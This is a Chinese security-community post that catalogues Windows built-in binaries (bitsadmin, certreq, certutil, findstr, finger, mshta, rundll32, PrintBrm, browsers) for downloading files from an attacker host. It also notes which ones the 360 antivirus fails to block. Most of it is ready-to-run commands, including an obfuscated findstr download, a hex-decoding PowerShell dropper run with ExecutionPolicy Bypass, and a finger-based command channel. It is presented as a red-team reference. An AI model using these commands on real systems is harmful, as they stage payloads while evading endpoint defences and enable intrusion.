> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/15896?u_atoken=06f516a5b29ea494d8683793b036b586&u_asig=0a472f5217298379325932863e00c5)

> 先知社区，先知安全技术社区

总结一下 win 的远程文件下载 部分`360依旧不拦截` 给各位打攻防的时候一个参考

lolbins
-------

### Bitsadmin

```
bitsadmin /create foo 
bitsadmin /addfile foo http://192.168.45.1:4444/1.txt C:\Windows\temp\1.txt
bitsadmin /RESUME foo 
bitsadmin /info foo /verbose
bitsadmin /complete foo

```

或者

```
bitsadmin /transfer foo http://192.168.45.1:4444/1.txt C:\Windows\temp\1.txt

```

可以考虑短链接

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001255-d594d094-8d6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001255-d594d094-8d6b-1.png)

其中 360 会拦截的点 /create /addfile /transfer

查询相关不拦截

如果目标机器存在 firfox 可以尝试往任务里插入 可以绕过 / create 但是不能 addfile 也意义不大

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001304-dae19f6e-8d6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001304-dae19f6e-8d6b-1.png)

### CertReq

```
certreq -POST -config http://192.168.45.1:8000/gen.py c:\windows\win.ini output.exe

```

下载 POST [http://192.168.45.1:8000/gen.py](http://192.168.45.1:8000/gen.py) 的响应到 output.txt

360 不杀 可以配合 powershell 解码 16 进制来落地 exe

```
param(
    [string]$inputFile,
    [string]$outputFile
)

$hexString = Get-Content $inputFile -Raw
$hexString = $hexString -replace '\s+', ''

$byteList = New-Object System.Collections.Generic.List[byte]

for ($i = 0; $i -lt $hexString.Length; $i += 2) {
    $byte = [Convert]::ToByte($hexString.Substring($i, 2), 16)
    $byteList.Add($byte)
}

[System.IO.File]::WriteAllBytes($outputFile, $byteList.ToArray())


```

在后缀为 exe 时 360 会告警 但是还是执行了 点击阻止只会删除 exe 这个跑起来的不管

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001320-e4ac5e62-8d6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001320-e4ac5e62-8d6b-1.png)

```
powershell -ExecutionPolicy Bypass -File hex.ps1 1.txt exp.exe

```

### Certutil

可以 base64 编解码 `decode encode`

hex 编解码 `decodehex encodehex`

编码无限制 解码限制的比较死

文件下载 限制的很死

```
certutil.exe -urlcache -split -f http://192.168.45.1:44444/1.txt C:\Windows\Temp\1.txt

```

还看见另一种

```
certutil.exe -verifyctl -f -split http://192.168.45.1:44444/1.txt C:\Windows\Temp\1.txt

```

但是没有复现成功 这种 360 不杀 感兴趣的师傅可以研究一下 [https://x.com/egre55/status/1087685529016193025](https://x.com/egre55/status/1087685529016193025)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001331-eb352480-8d6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001331-eb352480-8d6b-1.png)

### type

先开启`webdev`服务 设置匿名访问

```
wsgidav --host=0.0.0.0 --port=80 --root=test --auth=anonymous

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001339-ef9ff1da-8d6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001339-ef9ff1da-8d6b-1.png)

然后通过 type 来读文件

```
type \\192.168.45.1\DavWWWRoot\1.txt > 2.txt

```

### cmdl

360 会杀

设置所在目录权限 创建配置文件

`icacls %cd% /deny %username%:(OI)(CI)(DE,DC)`

```
[Connection Manager]
CMSFile=config
ServiceName=WindowsUpdate
TunnelFile=config
[Settings]
UpdateUrl=https://192.168.45.1:4444/1.txt


```

执行

```
cmdl32 /vpn /lan %cd%\config

```

会生成一个 VPN 开头的 tmp 文件

### ConfigSecurityPolicy

360 会杀

```
"C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe" http://192.168.45.1:4444/1.txt

```

文件会被保存到`%LOCALAPPDATA%\Microsoft\Windows\INetCache\IE`下

可以通过

```
cmd.exe /c "where /r %LOCALAPPDATA%\Microsoft\Windows\INetCache *"

```

查找

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001350-f63fe338-8d6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001350-f63fe338-8d6b-1.png)

### Esentutl

360 会拦截

还是先启一个`webdev`

```
wsgidav --host=0.0.0.0 --port=80 --root=test --auth=anonymous

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001358-faf63378-8d6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001358-faf63378-8d6b-1.png)

```
esentutl /Y "\\192.168.45.1\DavWWWRoot\1.txt"

```

### Expand

早上测拦 晚上恢复快照重新开的环境不拦了 不知道什么毛病

启 webdev 后 两个参数 一个源 一个目标

```
expand "\\192.168.45.1\DavWWWRoot\1.txt" "C:\Users\admin\Desktop\test\1.txt"

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001403-fe4b2808-8d6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001403-fe4b2808-8d6b-1.png)

### Extrac32

360 会拦

启个 webdev

```
extrac32 /c /Y "\\192.168.45.1\DavWWWRoot\1.txt" "C:\Users\admin\Desktop\test\1.txt"

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001413-03c0669a-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001413-03c0669a-8d6c-1.png)

### Findstr

360 不拦截

启个`webdev`

```
fin""""ds""tr /^l /^V  1145141919810 "\\192.168.45.1\DavWWWRoot\calc.exe" > "C:\Users\admin\Desktop\test\calc.exe"

```

当找不到字符串`1145141919810`时候 下载 calc

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001420-08203a6c-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001420-08203a6c-8d6c-1.png)

### finger

360 不杀

`server`和`agent`的实现可以参考`hyp3rlinx`师傅的

[https://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt](https://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt)

`hyp3rlinx`师傅提供的 poc 是基于 base64 的 本地需要`certutil`解密 而`certutil`是会被杀的

使用方法如下 这里我想下载 calc.exe 创建配置文件`finger.conf`

内容为`calc.exe` 在配置文件同目录需要存在`calc.exe`

修改 darkfinger 部分代码

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001426-0bb5a676-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001426-0bb5a676-8d6c-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001431-0f0495a8-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001431-0f0495a8-8d6c-1.png)

```
python darkfinger.py -d -c finger.conf -p 79

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001435-1163a906-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001435-1163a906-8d6c-1.png)

```
finger "ca10@192.168.45.1" | more +2 > calc.txt

```

给 10 秒确保下完

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001440-1426371c-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001440-1426371c-8d6c-1.png)

这里 360 会拦 certutil 那实际上 finger 的 server 没必要返回 base64

他 poc 要 base64 主要是配合他的那个 agent 用的

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001446-179812a8-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001446-179812a8-8d6c-1.png)

agent 的话还会拦截 powershell 的执行

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001450-19db291a-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001450-19db291a-8d6c-1.png)

这里操作空间挺大的 之后写个文章二开一下

### Makecab

360 会杀

启`webdev`

```
makecab "\\192.168.45.1\DavWWWRoot\1.txt" "C:\Users\admin\Desktop\test\1.cab"

```

下载文件并转为 cab 压缩包 然后通过`expand`命令解压

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001457-1e335b18-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001457-1e335b18-8d6c-1.png)

### Mshta

360 会拦

```
Mshta http://192.168.45.1/calc.exe

```

下载的文件保存到`%LOCALAPPDATA%\Microsoft\Windows\INetCache\IE`下

可以通过

```
cmd.exe /c "where /r %LOCALAPPDATA%\Microsoft\Windows\INetCache *"

```

查找

### Presentationhost

360 不拦

下载的文件保存到`%LOCALAPPDATA%\Microsoft\Windows\INetCache\IE`下

```
Presentationhost http://192.168.45.1/calc.exe

```

运行后会通过 ie 下载文件 类似 chrome 的 tmp 在浏览器未关闭 或 非正常关闭下 会保留

```
taskkill /im iexplore.exe /f

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001512-26f79dcc-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001512-26f79dcc-8d6c-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001515-290fcd50-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001515-290fcd50-8d6c-1.png)

### PrintBrm

360 不杀

```
wsgidav --host=0.0.0.0 --port=80 --root=. --auth=anonymous

```

启一个`webdev` 在根目录下我创建了一个 test 文件夹 其中存在`calc.exe`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001520-2c39caee-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001520-2c39caee-8d6c-1.png)

```
"C:\Windows\System32\spool\tools\PrintBrm.exe" -b -d "\\192.168.45.1\DavWWWRoot\test" -f 1.zip

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001526-2f8cdc2c-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001526-2f8cdc2c-8d6c-1.png)

后续可以通过 powershell 解压

```
Expand-Archive -Path "C:\Users\admin\Desktop\test\1.zip" -DestinationPath "C:\Users\admin\Desktop\test"

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001535-34e3fa02-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001535-34e3fa02-8d6c-1.png)

### replace

360 不拦

启个 webdev

```
replace.exe \\192.168.45.1\DavWWWRoot\calc.exe C:\Users\admin\Desktop\test /A

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001541-3898355a-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001541-3898355a-8d6c-1.png)

### Scrobj.dll

360 不杀

```
rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib http://192.168.45.1/calc.exe

```

下载的文件保存到`%LOCALAPPDATA%\Microsoft\Windows\INetCache\IE`下

会弹个框 执行完 kill 了就好

```
taskkill /im rundll32.exe /f

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001547-3c2b43e2-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001547-3c2b43e2-8d6c-1.png)

### shimgvw.dll

360 不杀

```
rundll32.exe C:\Windows\System32\shimgvw.dll,GenerateTypeLib http://192.168.45.1/calc.exe

```

下载的文件保存到`%LOCALAPPDATA%\Microsoft\Windows\INetCache\IE`下

会弹个照片查看器 父进程是 rundll32 kill 了就好

```
taskkill /im rundll32.exe /f

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001554-400381c8-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001554-400381c8-8d6c-1.png)

浏览器
---

### firefox chrome edge

差不多

`firefox` 360 不拦

```
"C:\Program Files\Mozilla Firefox\firefox.exe" http://192.168.45.1/1.bin
taskkill /im firefox.exe /f

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001559-4312214e-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001559-4312214e-8d6c-1.png)

`chrome` 360 不拦

会拦截乱七八糟的后缀 但是其实问题不大

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001604-45f76f54-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001604-45f76f54-8d6c-1.png)

临时文件直接复制一份出来用即可

通过 taskkill 结束进程的话 临时文件也会保留

```
"C:\Program Files\Google\Chrome\Application\chrome.exe" http://192.168.45.1/calc.exe
taskkill /im chrome.exe /f

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20241019001608-48b2fd76-8d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20241019001608-48b2fd76-8d6c-1.png)

`edge`

```
"C:\Program Files (x86)\Microsoft\EdgeCore\129.0.2792.89\msedge.exe" http://192.168.45.1/calc.exe

```

[https://www.manageengine.com/log-management/correlation-rules/bitsadmin-for-file-download.html](https://www.manageengine.com/log-management/correlation-rules/bitsadmin-for-file-download.html)

[https://lolbas-project.github.io/](https://lolbas-project.github.io/)

[https://x.com/egre55/status/1087685529016193025](https://x.com/egre55/status/1087685529016193025)

[https://mr0range.com/a-new-lolbin-using-the-windows-type-command-to-upload-download-files-81d7b6179e22](https://mr0range.com/a-new-lolbin-using-the-windows-type-command-to-upload-download-files-81d7b6179e22)

[https://elliotonsecurity.com/living-off-the-land-reverse-engineering-methodology-plus-tips-and-tricks-cmdl32-case-study/#case-study](https://elliotonsecurity.com/living-off-the-land-reverse-engineering-methodology-plus-tips-and-tricks-cmdl32-case-study/#case-study)

[https://github.com/LOLBAS-Project/LOLBAS/pull/151](https://github.com/LOLBAS-Project/LOLBAS/pull/151)

[https://www.sentinelone.com/labs/living-off-windows-land-a-new-native-file-downldr/](https://www.sentinelone.com/labs/living-off-windows-land-a-new-native-file-downldr/)

[https://x.com/egre55/status/985994639202283520](https://x.com/egre55/status/985994639202283520)

[https://forum.butian.net/share/2772](https://forum.butian.net/share/2772)

[https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/](https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/)

[https://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt](https://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt)

[https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/](https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/)

[https://x.com/notwhickey/status/1306023056847110144](https://x.com/notwhickey/status/1306023056847110144)